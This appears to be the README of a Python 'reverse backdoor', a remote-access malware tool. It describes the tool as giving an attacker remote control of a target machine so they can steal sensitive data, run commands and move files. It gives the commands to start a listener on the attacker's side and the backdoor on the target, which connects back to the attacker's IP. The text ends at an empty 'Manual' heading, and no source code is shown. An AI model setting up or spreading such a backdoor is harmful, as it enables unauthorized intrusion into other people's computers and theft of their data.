# Reverse Backdoor

## Description & Usage
A backdoor is program/malware which gives us remote access to target device. This tool is for reverse shell access, which allows us remotely control target machine, crawl in its system, steal sensitive data, execute commands, upload or download files. 

I am going to add more advanced features later :)

### Requirements
Python v3

## Run

```sh
# On your machine:
$ python listener.py --ip <your_ip> --port <port_number>

# On target machine:
$ python reverse_backdoor.py --ip <your_ip> --port <same_port>
```

## Manual